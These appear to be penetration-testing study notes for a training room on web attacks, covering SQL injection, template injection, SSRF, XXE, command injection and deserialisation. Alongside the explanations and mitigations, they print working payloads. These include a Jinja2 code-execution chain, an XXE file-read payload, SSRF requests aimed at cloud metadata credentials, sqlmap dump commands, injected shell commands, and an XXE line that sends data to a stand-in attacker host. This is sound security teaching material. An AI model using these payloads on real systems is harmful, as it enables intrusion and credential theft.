# Web Server Attacks - Part 2

## Overview

Building on the foundational enumeration and misconfiguration techniques from Part 1, this room covers more advanced web server attack techniques — focusing on exploitation of specific vulnerability classes commonly found in web server configurations and the applications running on them. Part 2 covers SQL injection, server-side template injection (SSTI), server-side request forgery (SSRF), XML External Entity (XXE) injection, and command injection — the vulnerability classes most likely to yield significant impact on a web application penetration test.

---

## Topics Covered

- SQL Injection (SQLi) — identification and exploitation
- Server-Side Template Injection (SSTI)
- Server-Side Request Forgery (SSRF)
- XML External Entity (XXE) Injection
- OS Command Injection
- Insecure deserialisation concepts

---

## Key Concepts

### SQL Injection (SQLi)

**Definition:** SQL injection occurs when user-supplied input is incorporated into a SQL query without sanitisation or parameterisation, allowing an attacker to modify the query's logic.

**Why It Happens:** String concatenation of user input directly into SQL query text, rather than using prepared statements with parameterised placeholders.

**Vulnerable query pattern (Python example — do not replicate):**
```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```
An attacker supplies `admin' --` as the username, commenting out the password check entirely.

**Impact:** Read arbitrary data from any database table, bypass authentication, modify or delete data, and in some configurations execute OS commands.

---

**Types of SQL Injection:**

| Type | How Output is Returned | Example Technique |
|------|----------------------|-----------------|
| In-band (Error-based) | Error messages reveal database info | Extract version from error message |
| In-band (UNION-based) | Results appended via UNION SELECT | `UNION SELECT username, password FROM users--` |
| Blind (Boolean-based) | True/false conditions change response | `AND 1=1` (normal) vs `AND 1=2` (changed) |
| Blind (Time-based) | Delay commands measure true/false | `AND SLEEP(5)--` (MySQL) |
| Out-of-Band | Results sent via DNS or HTTP to attacker | Used when other methods are blocked |

**SQLi Detection — Manual:**
```
'          ← Single quote — causes SQL syntax error if unsanitised
''         ← Two quotes — escapes the quote, closes it properly
1=1        ← Always-true condition
1=2        ← Always-false condition
' OR '1'='1   ← Classic auth bypass attempt
```

**SQLi Detection with sqlmap:**
```bash
# Basic detection
sqlmap -u "http://TARGET_IP/search?id=1" --dbs

# With a POST request
sqlmap -u "http://TARGET_IP/login" \
  --data="username=test&password=test" \
  --dbs

# Dump a specific table
sqlmap -u "http://TARGET_IP/search?id=1" \
  -D database_name -T users --dump
```

**UNION-based SQLi (manual):**
The UNION technique requires knowing the number of columns returned by the original query and finding which columns reflect data in the response.

```sql
-- Step 1: Determine column count (increment ORDER BY until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here means 2 columns

-- Step 2: Find visible columns (NULL fills invisible positions)
' UNION SELECT NULL, NULL--
' UNION SELECT 'a', NULL--   ← if 'a' appears in response, column 1 is visible

-- Step 3: Extract data
' UNION SELECT username, password FROM users--
```

---

### Server-Side Template Injection (SSTI)

**Definition:** SSTI occurs when user-supplied input is embedded directly into a server-side template without sanitisation, allowing the attacker to inject template expressions that are evaluated by the template engine on the server.

**Why It Happens:** Developers dynamically construct template strings by concatenating user input — e.g., `"Hello, " + username + "!"` in a template context — rather than passing variables to a pre-defined template.

**Template engines and their expression syntax:**

| Template Engine | Language | Expression Syntax | Test Payload |
|----------------|---------|-----------------|-------------|
| Jinja2 | Python | `{{ }}`, `{% %}` | `{{7*7}}` → `49` |
| Twig | PHP | `{{ }}`, `{% %}` | `{{7*7}}` → `49` |
| Freemarker | Java | `${}`, `<#>` | `${7*7}` → `49` |
| Pebble | Java | `{{ }}` | `{{7*7}}` → `49` |
| Velocity | Java | `${}` | `#set($x=7*7)$x` |
| Handlebars | Node.js | `{{ }}` | `{{7*7}}` |

**Detection:**
If the application reflects user input (e.g., a name field that appears in the response), submit mathematical expressions in template syntax:
```
{{7*7}}
${7*7}
<%= 7*7 %>
```
If the response contains `49` instead of the literal string `{{7*7}}`, the template engine is evaluating the input — SSTI is confirmed.

**SSTI Exploitation (Jinja2 — Python):**
Confirmed SSTI in Jinja2 can escalate to RCE by traversing Python's class hierarchy to access OS functions:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Note:** The specific payload chain depends on which Jinja2 globals are accessible and any sandboxing in place. The above is a common starting point.

**SSTI Impact:** Ranges from information disclosure (reading server variables) to full remote code execution.

---

### Server-Side Request Forgery (SSRF)

**Definition:** SSRF occurs when an application makes a server-side HTTP request to a URL that can be controlled by the attacker. The server makes the request on behalf of the attacker — from inside the network.

**Why It Happens:** Applications legitimately fetch remote content (URL preview, webhook delivery, metadata fetching) without restricting which hosts can be requested.

**Impact:**
- Access internal services not exposed to the internet (databases, internal APIs, admin panels)
- Read cloud metadata endpoint for credentials (`http://169.254.169.254/...`)
- Port scan the internal network via the server's outbound requests
- Bypass IP-based access controls (internal APIs that trust localhost or the internal network)
- In severe cases (open redirect + SSRF), leverage to pivot to other internal services

**Basic SSRF Test:**
```
# If the application accepts a URL parameter:
http://TARGET_IP/fetch?url=http://internal-service/

# Try localhost
http://TARGET_IP/fetch?url=http://127.0.0.1/admin

# Try cloud metadata
http://TARGET_IP/fetch?url=http://169.254.169.254/latest/meta-data/
```

**AWS Metadata via SSRF:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```
Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token) if the EC2 instance has an IAM role attached.

**SSRF Bypass Techniques:**
```
# DNS rebinding / alternative representations
http://0177.0.0.1/         ← Octal for 127.0.0.1
http://2130706433/         ← Decimal for 127.0.0.1
http://[::1]/              ← IPv6 loopback
http://localhost/          ← Hostname resolving to 127.0.0.1
http://127.0.0.1.nip.io/  ← Wildcard DNS resolving to 127.0.0.1
```

---

### XML External Entity (XXE) Injection

**Definition:** XXE injection occurs when an application parses XML input that includes a reference to an external entity, and the XML parser is configured to resolve those external entities. This allows an attacker to read local files, perform SSRF, or in some cases achieve RCE.

**Why It Happens:** XML parsers resolve external entity references by default in many languages and libraries unless explicitly disabled. Applications that accept XML input (SOAP services, file uploads, API endpoints accepting `Content-Type: application/xml`) are vulnerable if their parser is not hardened.

**Basic XXE Payload — Reading a local file:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```
If the parser resolves the entity, the content of `/etc/passwd` is included in the `<data>` element of the response.

**XXE for SSRF:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

**Blind XXE (out-of-band):**
When the server doesn't return the entity value in the response, use an out-of-band channel to exfiltrate data — the entity references a URL on an attacker-controlled server, and the data is appended:
```xml
<!ENTITY xxe SYSTEM "http://ATTACKER_IP/?data=EXFILTRATED_DATA">
```

**Mitigation:** Disable external entity resolution in the XML parser configuration. In Java: `factory.setFeature("http://xml.org/sax/features/external-general-entities", false)`.

---

### OS Command Injection

**Definition:** Command injection occurs when user-supplied input is incorporated into an OS-level command executed by the server without sanitisation, allowing the attacker to append or modify the command.

**Why It Happens:** Developers use OS commands for legitimate server-side functions (DNS lookups, file operations, image processing, system diagnostics) and include user input in those commands without sanitisation.

**Injection separators (Linux):**

| Separator | Behaviour |
|-----------|----------|
| `;` | Execute second command after first, regardless of first's exit code |
| `&&` | Execute second command only if first succeeds |
| `\|\|` | Execute second command only if first fails |
| `\|` | Pipe output of first command into second |
| `` `cmd` `` | Command substitution — execute and embed output |
| `$(cmd)` | Command substitution alternative |
| `\n` (newline) | Execute next command on new line |

**Windows separators:**
- `&`, `&&`, `||`, `|` (same logic as Linux)
- Newline `\r\n`

**Detection payload (out-of-band delay):**
```bash
127.0.0.1; sleep 5
127.0.0.1 & ping -c 5 127.0.0.1 &
```
A 5-second delay in the response confirms time-based blind command injection.

**Confirming RCE:**
```bash
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; uname -a
```
If OS output appears in the response, command injection is confirmed with output visibility.

---

### Insecure Deserialisation (Concept)

**Definition:** Applications serialise objects (convert them to a bytestream or string representation) for storage or transmission, then deserialise them (reconstruct the object) when needed. If attacker-controlled data is deserialised without validation, the deserialisation process itself can execute arbitrary code.

**Languages most commonly affected:**
- Java — `ObjectInputStream` deserialisation; gadget chains via `ysoserial`
- PHP — `unserialize()` function with magic methods (`__wakeup()`, `__destruct()`)
- Python — `pickle.loads()` executing arbitrary code embedded in the pickle stream
- Ruby — `Marshal.load()`

**Indicators of serialised data:**
- Java: base64-encoded strings starting with `rO0` (decoded: `\xac\xed\x00\x05`)
- PHP: strings matching `O:4:"User":2:{s:4:"name";...}` pattern
- Python Pickle: binary data in cookies or request parameters

**Why it matters:** Exploiting deserialisation vulnerabilities leads directly to RCE without going through any application logic. Detection typically requires finding the serialised object in a cookie, request parameter, or API field.

---

## Workflow / Process

```
Identify injectable parameters:
  All URL parameters (?id=, ?search=, ?user=)
  All form fields (login, search, profile)
  All HTTP headers that the application uses (User-Agent, X-Forwarded-For, Referer)
  Any XML input points (SOAP endpoints, file upload of XML)
  Any URL parameters passed to fetch/request functions
        |
        v
Test for SQLi:
  Submit single quote ' — observe error or changed response
  Run sqlmap on identified parameters
  Enumerate databases, tables, and dump credentials
        |
        v
Test for SSTI:
  Submit {{7*7}} in user-reflected fields
  Confirm with multiple template syntaxes
  If confirmed, escalate to RCE using engine-specific payload
        |
        v
Test for SSRF:
  Any URL/path parameter that the server fetches
  Try localhost, internal IPs, cloud metadata endpoint
  Use out-of-band callback (Burp Collaborator) for blind SSRF
        |
        v
Test for XXE:
  Any endpoint accepting XML (Content-Type: application/xml)
  Replace legitimate XML with entity injection payload
  Test local file read, then SSRF via entity
        |
        v
Test for command injection:
  Any functionality suggesting OS-level operations (ping, whois, resolve, convert)
  Inject separators: ;, &&, |
  Time-based confirmation: ; sleep 5
  Confirm output: ; whoami
```

---

## Important Terminology

| Term | Meaning |
|------|---------|
| SQLi | SQL Injection — user input modifying SQL query logic |
| UNION SQLi | Appending a second SELECT query via UNION to extract data |
| Blind SQLi | SQLi where results are inferred from response differences or timing, not directly returned |
| SSTI | Server-Side Template Injection — user input evaluated by server-side template engine |
| SSRF | Server-Side Request Forgery — attacker controls a URL the server fetches |
| XXE | XML External Entity — XML parser resolves attacker-controlled entity to read files or make requests |
| Command Injection | User input executed as OS commands by the server |
| Insecure Deserialisation | Deserialising attacker-controlled data executes malicious code during object reconstruction |
| Gadget Chain | A sequence of existing class methods chained together to achieve RCE during Java deserialisation |
| OOB | Out-of-Band — exfiltrating data via DNS or HTTP to an attacker-controlled server, used when in-band reflection is blocked |

---

## Real-World Relevance

- SQLi remains one of the most commonly exploited vulnerabilities despite being well-understood — parameterised queries are the complete mitigation but are still absent in production systems
- SSRF to cloud metadata endpoints has been the root cause of several major cloud-hosted application breaches — the 2019 Capital One breach is the most cited example
- XXE is often present in enterprise applications consuming SOAP/XML services where the parser configuration has never been reviewed
- SSTI is consistently found in applications that dynamically build email templates, HTML pages, or error messages from user input
- Command injection on diagnostic utilities (ping, traceroute, nslookup exposed via web interface) is a classic high-severity finding in network device and IoT web management interfaces

---

## Key Learnings

- A single quote `'` is the fastest SQLi probe — always start there on any user-controlled database-querying parameter
- `sqlmap` automates SQLi discovery and exploitation — use it for efficiency but understand what it is doing
- SSTI is confirmed by mathematical expression evaluation (`{{7*7}}` → `49`) — confirmation before exploitation is essential
- SSRF targets include not just internal web services but cloud metadata endpoints — always test `169.254.169.254` in cloud-hosted applications
- XXE requires the application to parse XML — identify XML-consuming endpoints first, then test entity injection
- Command injection is confirmed by time-based delays before attempting output-visible payloads

---

## Conclusion

The vulnerability classes covered in Part 2 — SQLi, SSTI, SSRF, XXE, and command injection — represent the highest-impact findings in web application penetration testing. Each can lead from a single injectable parameter to full database access, remote code execution, or internal network access. Systematic testing requires identifying all input points, understanding what server-side processing each input undergoes, and applying the appropriate test for each vulnerability class. Combined with the server-level misconfigurations from Part 1, these techniques form a comprehensive approach to web server security testing.
